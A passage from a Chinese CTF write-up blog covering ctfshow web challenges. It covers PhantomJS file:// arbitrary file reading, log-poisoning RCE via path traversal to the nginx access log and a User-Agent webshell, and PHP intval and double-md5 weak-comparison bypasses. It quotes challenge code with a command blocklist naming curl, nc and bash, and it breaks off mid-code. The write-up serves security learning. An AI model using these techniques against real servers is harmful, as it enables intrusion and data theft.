<p>所以这里可以看到其实我们的flag是写入了这个下载的图片中的，也就是我们的响应内容中，假如没有执行file:&#x2F;&#x2F;flag的话，就会只有一个空图片</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219093531467.png" alt="image-20241219093531467"></p>
<p>而如果我们进行了正确的攻击后就会</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219093559492.png" alt="image-20241219093559492"></p>
<h3 id="PhantomJs-任意文件读取"><a href="#PhantomJs-任意文件读取" class="headerlink" title="PhantomJs 任意文件读取"></a>PhantomJs 任意文件读取</h3><p>PhantomJS 使用内部模块 ：，打开、关闭、呈现和执行网页上的多个操作，该模块存在任意文件读取漏洞。该漏洞存在于模块的函数中，该函数加载指定的 URL 并调用给定的回调。打开 HTML 文件时，攻击者可以提供特制的文件内容，从而允许读取文件系统上的任意文件。该漏洞通过使用作为函数回调来演示，从而生成目标文件的 PDF 或图像。 <code>webpage</code> <code>page.open()</code> <code>webpage</code> <code>page.render()</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> webPage = <span class="built_in">require</span> ( <span class="string">&#x27;网页&#x27;</span> ); </span><br><span class="line"><span class="keyword">var</span> page = webPage.<span class="title function_">create</span>();</span><br></pre></td></tr></table></figure>

<p>上述 JavaScript 代码初始化并创建一个页面对象，可用于执行进一步的操作，例如加载网页。</p>
<p>在下面的代码片段中，该函数负责打开和解析提供的 URL，并使用该函数生成 PNG 图像。 <code>page.open()</code> <code>page.render()</code></p>
<p>此外， PhantomJS 还会在内部调用检查所提供 URL 中的方案。如果提供的方案为空，则将其设置为给定 URL 的默认方案。</p>
<p>从下面显示的代码中可以看出这一点，这样做是为了访问本地存储的 HTML&#x2F;CSS 文件。 <code>page.open()</code> <code>WebPage::openUrl()</code> <code>file://</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件：phantom/phantomjs/src/webpage.<span class="property">cpp</span> </span><br><span class="line"><span class="number">954</span>：<span class="comment">//如果方案为空，则假定为本地文件 </span></span><br><span class="line"><span class="number">955</span>：<span class="keyword">if</span> (url.<span class="title function_">scheme</span>().<span class="title function_">isEmpty</span>()) &#123; </span><br><span class="line"><span class="number">956</span>：url.<span class="title function_">setPath</span>(<span class="title class_">QFileInfo</span>(url.<span class="title function_">toString</span>()).<span class="title function_">absoluteFilePath</span>().<span class="title function_">prepend</span>( <span class="string">&quot;/&quot;</span> )); </span><br><span class="line"><span class="number">957</span>：url.<span class="title function_">setScheme</span>( <span class="string">&quot;file&quot;</span> ); </span><br><span class="line"><span class="number">958</span>：&#125;</span><br></pre></td></tr></table></figure>

<p>因此，使用页面渲染代码片段将生成一个空白的 png 图像，因为它不会解析提供的 URL（该 URL 已设置为方案）。而使用带方案的将生成包含提供的 URL 内容的渲染图像。 <code>page.open(&#39;www.google.com&#39;)</code> <code>file://</code> <code>page.open(&#39;https://www.google.com&#39;)</code> <code>https://</code></p>
<p>所以这就是为什么我们攻击失败的时候也会返回一张图片但是图片是空的，再结合我们的exp可以想到这段payload的意思了，其实我们确实是访问了一张空图片，但是因为执行了我们的html文件，这个代码中会把flag写入我们的图片中</p>
<p>PhantomJS 还使用一个开关，该开关需要一个布尔值，默认情况下设置为。该开关启用 PhantomJS 中的网络安全功能，并禁止触发跨域 XHR 请求。 <code>--web-security</code> <code>True</code></p>
<p>由于跨域 XHR 限制，本地存储的 HTML 文件不允许触发对任意外部实体的请求，并且由于实现原因，除非在标头中明确指定，否则也无法从跨域实体读取响应。 <code>XHR</code> <code>Same Origin Policy</code></p>
<p>当经过PhantomJS解析后，可以通过发出XHR请求来读取其中的内容。</p>
<h2 id="ALL-INFO-U-WANT"><a href="#ALL-INFO-U-WANT" class="headerlink" title="ALL_INFO_U_WANT"></a>ALL_INFO_U_WANT</h2><h3 id="日志注入"><a href="#日志注入" class="headerlink" title="#日志注入"></a>#日志注入</h3><p>是一个玩魔方的游戏</p>
<p><img src="/./../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20241219152554679.png" alt="image-20241219152554679"></p>
<p>扫目录</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">11</span>:<span class="number">36</span>:<span class="number">56</span>] Scanning:</span><br><span class="line">[<span class="number">11</span>:<span class="number">37</span>:<span class="number">20</span>] <span class="number">200</span> -   441B - /index.php.bak</span><br><span class="line">[<span class="number">11</span>:<span class="number">37</span>:<span class="number">22</span>] <span class="number">301</span> -   169B - /media  -&gt;  http://b87fcdf0-43c4-<span class="number">411b-9727</span>-<span class="number">01cb51888a31.</span>challenge.ctf.<span class="built_in">show</span>/media/</span><br><span class="line">[<span class="number">11</span>:<span class="number">37</span>:<span class="number">22</span>] <span class="number">403</span> -   555B - /media/</span><br><span class="line">[<span class="number">11</span>:<span class="number">37</span>:<span class="number">28</span>] <span class="number">301</span> -   169B - /scripts  -&gt;  http://b87fcdf0-43c4-<span class="number">411b-9727</span>-<span class="number">01cb51888a31.</span>challenge.ctf.<span class="built_in">show</span>/scripts/</span><br><span class="line">[<span class="number">11</span>:<span class="number">37</span>:<span class="number">28</span>] <span class="number">403</span> -   555B - /scripts/</span><br><span class="line">[<span class="number">11</span>:<span class="number">37</span>:<span class="number">30</span>] <span class="number">301</span> -   169B - /styles  -&gt;  http://b87fcdf0-43c4-<span class="number">411b-9727</span>-<span class="number">01cb51888a31.</span>challenge.ctf.<span class="built_in">show</span>/styles/</span><br></pre></td></tr></table></figure>

<p>发现一个200的&#x2F;index.php.bak文件，进行访问下载</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">visit all_info_u_want.php <span class="keyword">and</span> you will get all information you want</span><br><span class="line"></span><br><span class="line">= =Thinking that it may be difficult, i decided to show you the source code:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//give you all information you want</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;all_info_i_want&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="string">&quot;/var/www/html/&quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="comment">//really baby include</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">really really really baby challenge right? </span><br></pre></td></tr></table></figure>

<p>访问all_info_u_want.php，传入all_info_i_want参数就得到了当前php版本的配置信息了，</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/all_info_u_want.php?<span class="attribute">all_info_i_want</span>=1</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/36D%E6%9D%AF+%E7%BB%83%E6%89%8B%E8%B5%9B/image-20250516115212042.png" alt="image-20250516115212042"></p>
<p>但是我们的利用点还是include($file)，不过这道题说实真的太仁慈了，这里直接利用日志注入就可以了</p>
<p>这里可以看到是开启了日志记录的功能的，那我们尝试包含一下日志文件</p>
<p>报错看服务器版本nginx&#x2F;1.20.1</p>
<p>那我们访问一下</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">file</span>=../../../var/<span class="built_in">log</span>/nginx/<span class="keyword">access</span>.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>

<p>目录穿越后就可以看到我们的日志文件了</p>
<p>抓包，在UA头插入恶意命令或者一句话木马，然后就可以进行rce了</p>
<p>发现一个假的flag，提示flag在etc文件，让我们自己去找，这里的话可以一个个找也可以直接在终端进行命令</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">find</span> /etc -name “*” | xargs <span class="keyword">grep</span> “ctfshow&#123;</span><br></pre></td></tr></table></figure>

<p>正常来说这个命令就是用来找包含flag字符串的文件的，但是好像蚁剑里面得把<code>-name “*”</code>去掉，没搞明白原因</p>
<p>我说怎么查不出来flag，原来flag是ctfshow开头的</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">find</span> /etc | xargs <span class="keyword">grep</span> <span class="string">&quot;ctfshow&#123;&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/36D%E6%9D%AF+%E7%BB%83%E6%89%8B%E8%B5%9B/image-20250516120337230.png" alt="image-20250516120337230"></p>
<p>成功拿到flag</p>
<h2 id="WUSTCTF-朴实无华-Revenge"><a href="#WUSTCTF-朴实无华-Revenge" class="headerlink" title="WUSTCTF_朴实无华_Revenge"></a>WUSTCTF_朴实无华_Revenge</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$len</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="variable">$l</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="variable">$k</span>=<span class="title function_ invoke__">intval</span>(<span class="variable">$len</span>/<span class="number">2</span>)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="variable">$k</span>;<span class="variable">$j</span>++)</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="variable">$j</span>,<span class="number">1</span>)!=<span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>,<span class="variable">$len</span>-<span class="variable">$j</span>-<span class="number">1</span>,<span class="number">1</span>)) &#123;</span><br><span class="line">            <span class="variable">$l</span>=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$l</span>==<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="variable">$numPositve</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$numReverse</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$num</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^0-9.-]/&#x27;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;非洲欢迎你1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$numPositve</span> &lt;= -<span class="number">999999999999999999</span> || <span class="variable">$numPositve</span> &gt;= <span class="number">999999999999999999</span>) &#123; <span class="comment">//在64位系统中 intval()的上限不是2147483647 省省吧</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;非洲欢迎你2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$numPositve</span> === <span class="variable">$numReverse</span> &amp;&amp; !<span class="title function_ invoke__">isPalindrome</span>(<span class="variable">$num</span>) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>)))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;more&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;tail&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;less&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;head&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;tac&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;$&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;sort&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;nc&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="variable">$get_flag</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;36dCTFShow&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;快到非洲了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">去非洲吧</span><br></pre></td></tr></table></figure>

<p>先看level 1</p>
<h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="variable">$numPositve</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$numReverse</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$num</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^0-9.-]/&#x27;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;非洲欢迎你1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$numPositve</span> &lt;= -<span class="number">999999999999999999</span> || <span class="variable">$numPositve</span> &gt;= <span class="number">999999999999999999</span>) &#123; <span class="comment">//在64位系统中 intval()的上限不是2147483647 省省吧</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;非洲欢迎你2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$numPositve</span> === <span class="variable">$numReverse</span> &amp;&amp; !<span class="title function_ invoke__">isPalindrome</span>(<span class="variable">$num</span>) )&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;金钱解决不了穷人的本质问题&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>试了一下八进制也绕不了，num进入isPalindrome的时候是八进制转化成十进制的数</p>
<p>本地测了一下浮点数可以绕，加个0就可以绕过函数的检查了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$num</span> = <span class="number">1.10</span>;</span><br><span class="line"><span class="variable">$numPositve</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>);</span><br><span class="line"><span class="variable">$numReverse</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$num</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$numPositve</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$numReverse</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$numPositve</span>===<span class="variable">$numReverse</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;yes&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//11yes</span></span><br></pre></td></tr></table></figure>

<p>但是我发现我的php对传入的num&#x3D;1.10在传入isPalindrome的时候会变成1.1，但是题目中不会</p>
<p>payload</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-0, 0- , 1.10 , 0. , .0 ,0.00</span></span><br></pre></td></tr></table></figure>

<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$md5</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$md5</span>==<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>)))</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;去非洲吧&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>双重md5弱比较绕过，直接爆破就行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">0</span>,<span class="number">1000000000000</span>):</span><br><span class="line">    data = <span class="string">&quot;0e&quot;</span>+<span class="title function_ invoke__">str</span>(i)</span><br><span class="line">    md5 = hashlib.<span class="title function_ invoke__">md5</span>(data.<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    md52 = hashlib.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">str</span>(md5).<span class="title function_ invoke__">encode</span>(<span class="string">&#x27;utf-8&#x27;</span>)).<span class="title function_ invoke__">hexdigest</span>()</span><br><span class="line">    <span class="keyword">if</span> md52[<span class="number">0</span>:<span class="number">2</span>] == <span class="string">&#x27;0e&#x27;</span> <span class="keyword">and</span> md52[<span class="number">2</span>:].<span class="title function_ invoke__">isnumeric</span>():</span><br><span class="line">        <span class="keyword">print</span>(data+<span class="string">&quot;: &quot;</span>+md52)</span><br></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;<span class="attribute">md5</span>=0e1138100474</span><br></pre></td></tr></table></figure>

<h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strstr</span>(<span 